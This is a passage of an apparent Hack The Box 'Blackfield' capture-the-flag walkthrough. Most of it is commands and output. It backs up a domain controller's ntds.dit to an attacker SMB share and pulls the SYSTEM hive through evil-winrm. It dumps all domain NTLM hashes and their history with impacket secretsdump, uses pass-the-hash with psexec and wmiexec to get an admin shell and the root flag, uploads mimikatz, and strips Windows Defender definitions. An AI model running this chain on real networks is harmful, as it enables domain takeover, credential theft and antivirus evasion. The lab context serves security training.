+Do you want to start the backup operation?
+[Y] Yes [N] No Y
+
+The backup operation to \\10.10.14.3\smb is starting.
+Creating a shadow copy of the volumes specified for backup...
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Creating a shadow copy of the volumes specified for backup...
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Scanning the file system...
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Found (12) files.
+Scanning the file system...
+Found (12) files.
+Scanning the file system...
+Found (12) files.
+Scanning the file system...
+Found (12) files.
+Scanning the file system...
+Found (12) files.
+Scanning the file system...
+Found (12) files.
+Scanning the file system...
+Found (12) files.
+Scanning the file system...
+Found (12) files.
+Creating a backup of volume (C:), copied (100%).
+Creating a backup of volume (C:), copied (100%).
+Summary of the backup operation:
+------------------
+
+The backup operation successfully completed.
+The backup of volume (C:) completed successfully.
+Log of files successfully backed up:
+C:\Windows\Logs\WindowsServerBackup\Backup-15-11-2020_14-31-40.log
+
+====================================================================================
+
+Now we have a backup in our smbshare. Now we have to find the versions set by wbadmin the command 
+to do this is the following:
+COMMAND:
+====================================================================================
+wbadmin get versions
+====================================================================================
+OUTPUT:
+====================================================================================
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Backup time: 9/21/2020 3:00 PM
+Backup location: Network Share labeled \\10.10.14.4\blackfieldA
+Version identifier: 09/21/2020-23:00
+Can recover: Volume(s), File(s)
+
+Backup time: 11/15/2020 6:31 AM
+Backup location: Network Share labeled \\10.10.14.3\smb
+Version identifier: 11/15/2020-14:31
+Can recover: Volume(s), File(s)
+====================================================================================
+
+Now that we have the version we will use another command that lets us extract nitds file.
+COMMAND:
+====================================================================================
+echo Y | wbadmin start recovery -version:11/15/2020-14:31 -itemtype:file -items:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+====================================================================================
+
+OUTPUT:
+====================================================================================
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Retrieving volume information...
+You have chosen to recover the file(s) C:\windows\ntds\ntds.dit from the
+backup created on 11/15/2020 6:31 AM to C:\.
+Preparing to recover files...
+
+Do you want to continue?
+[Y] Yes [N] No Y
+
+Running the recovery operation for C:\windows\ntds\ntds.dit, copied (12%).
+Currently recovering C:\windows\ntds\ntds.dit.
+Running the recovery operation for C:\windows\ntds\ntds.dit, copied (37%).
+Currently recovering C:\windows\ntds\ntds.dit.
+Running the recovery operation for C:\windows\ntds\ntds.dit, copied (54%).
+Currently recovering C:\windows\ntds\ntds.dit.
+Running the recovery operation for C:\windows\ntds\ntds.dit, copied (70%).
+Currently recovering C:\windows\ntds\ntds.dit.
+Running the recovery operation for C:\windows\ntds\ntds.dit, copied (90%).
+Currently recovering C:\windows\ntds\ntds.dit.
+Successfully recovered C:\windows\ntds\ntds.dit to C:\.
+The recovery operation completed.
+Summary of the recovery operation:
+--------------------
+
+Recovery of C:\windows\ntds\ntds.dit to C:\ successfully completed.
+Total bytes recovered: 18.00 MB
+Total files recovered: 1
+Total files failed: 0
+
+Log of files successfully recovered:
+C:\Windows\Logs\WindowsServerBackup\FileRestore-15-11-2020_14-50-02.log
+====================================================================================
+What is happening is that wbadmin has to pull from our backuup and then write to the c: drive which
+may take a while.
+
+We can now download the 'ntds.dit' from evil-winrm to our local system. What we are getting from
+this file is the active directory domain database but it is encrypted with boot key that is in the 
+system hive. We are downloading the active directory database downloading the password to the 
+active directory database "reg save HKLM\SYSTEM".
+
+We want to save the system hive where the boot key exists. We will extract all accounts in it.
+COMMAND:
+====================================================================================
+reg save HKLM\SYSTEM system.hive
+====================================================================================
+OUTPUT:
+====================================================================================
+*Evil-WinRM* PS C:\> reg save hklm\system system.hive
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\> download system.hive
+Info: Downloading C:\\system.hive to system.hive
+
+====================================================================================
+
+Now we can use an impacket script that will allow us to dump the hashes stored in the ntds.dit file
+COMMAND:
+====================================================================================
+/opt/impacket-venv/bin/secretsdump.py -ntds ntds.dit -system system.hive  LOCAL
+====================================================================================
+
+OUTPUT:
+====================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+====================================================================================
+
+We also want to look at password history, activve directory storees old passwords. You can get the 
+last 24 password stored. Important to have to restore passwords changed previously.
+
+COMMAND:
+====================================================================================
+/opt/impacket-venv/bin/secretsdump.py -history -ntds ntds.dit -system system.hive  LOCAL
+====================================================================================
+
+OUTPUT:
+====================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:7f1e4ff8c6a8e6b6fcae2d9c0572cd62:::
+Administrator_history1:500:aad3b435b51404eeaad3b435b51404ee:ac2983b6afa7bdea9360fa7a95e31855:::
+Administrator_history2:500:aad3b435b51404eeaad3b435b51404ee:a47feb765cf90d3216423e9cfedea565:::
+Administrator_history3:500:aad3b435b51404eeaad3b435b51404ee:24958cffdd2aa3125c63c3fd374db44b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
+DC01$_history0:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
+DC01$_history1:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
+DC01$_history2:1000:aad3b435b51404eeaad3b435b51404ee:21cb362b80c113a49f39943f3c2cb5e1:::
+DC01$_history3:1000:aad3b435b51404eeaad3b435b51404ee:e790ef736c276cc03a143bccd7d10ad4:::
+DC01$_history4:1000:aad3b435b51404eeaad3b435b51404ee:8b3d254201af8899b2648b43a66ba3e4:::
+DC01$_history5:1000:aad3b435b51404eeaad3b435b51404ee:b624dc83a27cc29da11d9bf25efea796:::
+DC01$_history6:1000:aad3b435b51404eeaad3b435b51404ee:e8ef2d90a72603a5e3d17948665f4fa2:::
+DC01$_history7:1000:aad3b435b51404eeaad3b435b51404ee:3c6028a9530a6f75da11f1aa69a9392b:::
+DC01$_history8:1000:aad3b435b51404eeaad3b435b51404ee:3f335e65658b01c59a1b5a028cdf911b:::
+DC01$_history9:1000:aad3b435b51404eeaad3b435b51404ee:4a576f3a479250d5ca5d5d568b963911:::
+DC01$_history10:1000:aad3b435b51404eeaad3b435b51404ee:a880c96fb92f13dc3ac43041603ff2f4:::
+DC01$_history11:1000:aad3b435b51404eeaad3b435b51404ee:657e9bcbcb9881f3046f46d6ea2c5368:::
+DC01$_history12:1000:aad3b435b51404eeaad3b435b51404ee:a3dd9b235d409732386e410d869ae66c:::
+DC01$_history13:1000:aad3b435b51404eeaad3b435b51404ee:d5217db598561daea001275a7b95f596:::
+DC01$_history14:1000:aad3b435b51404eeaad3b435b51404ee:61aa6c112ae61a801f41d0751b50f681:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+krbtgt_history0:502:aad3b435b51404eeaad3b435b51404ee:ac4e588741c6d7d6505dab2ab46e1ca8:::
+krbtgt_history1:502:aad3b435b51404eeaad3b435b51404ee:00d92f0b41d329425102097d01f308cc:::
+krbtgt_history2:502:aad3b435b51404eeaad3b435b51404ee:1968f16be5f9516357e895007068c944:::
+krbtgt_history3:502:aad3b435b51404eeaad3b435b51404ee:1e18d532c339489708919207bb5d2d29:::
+krbtgt_history4:502:aad3b435b51404eeaad3b435b51404ee:c63ade0c489e7e40bcaf7c11f3d8884d:::
+krbtgt_history5:502:aad3b435b51404eeaad3b435b51404ee:2dd4d92918d5ad9f3f65d183508fcb42:::
+krbtgt_history6:502:aad3b435b51404eeaad3b435b51404ee:a3c84c926b94b321c9d0a0bd471b025e:::
+krbtgt_history7:502:aad3b435b51404eeaad3b435b51404ee:68a09bea08dfe60526d69540df48d066:::
+krbtgt_history8:502:aad3b435b51404eeaad3b435b51404ee:b5ca59b606a13445af2043409d2c0086:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+audit2020_history0:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
+audit2020_history1:1103:aad3b435b51404eeaad3b435b51404ee:c63407eac237a49a7e559f453cc6a4df:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+support_history0:1104:aad3b435b51404eeaad3b435b51404ee:eca3e06b52f76be986e4cd4a01c0db69:::
+support_history1:1104:aad3b435b51404eeaad3b435b51404ee:7375cef738882d6c3a4592217951f491:::
+====================================================================================
+
+Now we have the history for all password hashes, so we can revert back if necessary.
+
+We can now run psexec as adminstrator and get a remote admin shell.
+
+COMMAND:
+====================================================================================
+/opt/impacket-venv/bin/psexec.py administrator@10.10.10.192 -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
+====================================================================================
+
+OUTPUT:
+====================================================================================
+
+====================================================================================
+
+We navigate to the desktop for root.txt but apparently the file is encrypted we need decrypt the file
+by becoming administrator.
+COMMAND:
+====================================================================================
+root@kali:~/htb/blackfield# /opt/impacket-venv/bin/wmiexec.py administrator@10.10.10.192 -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
+====================================================================================
+
+OUPUT:
+====================================================================================
+C:\Users\administrator\Desktop>type root.txt
+112ce0ed8359e19f4ab3df431b33c5f0
+====================================================================================
+
+Last thing to do is use mimikatz to reset the old users password for audit2020.
+COMMAND:
+====================================================================================
+Evil-WinRM* PS C:\> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+====================================================================================
+Will have to disable antivirus as mimikatz is being deleted by av.
+
+COMMAND:
+====================================================================================
+cd "Program Files\Windows Defender"
+.\mpcmdrum.exe -RemoveDefinitions -All
+====================================================================================
+
+
